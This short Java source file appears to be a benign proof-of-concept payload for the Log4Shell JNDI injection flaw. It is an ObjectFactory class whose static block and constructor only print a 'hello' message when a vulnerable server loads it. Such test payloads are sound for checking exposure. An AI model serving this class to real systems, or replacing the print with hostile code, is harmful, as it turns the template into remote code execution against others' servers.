import javax.naming.Context;
import javax.naming.Name;
import javax.naming.spi.ObjectFactory;
import java.util.Hashtable;

public class SystemOut implements ObjectFactory {

    public SystemOut() {
        System.out.println("LOG4SHELL SAYS HELLO FROM INIT");
    }

    static {
        System.out.println("LOG4SHELL SAYS HELLO FROM STATIC");
    }

    public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable<?, ?> environment) throws Exception {
        return this;
    }
}
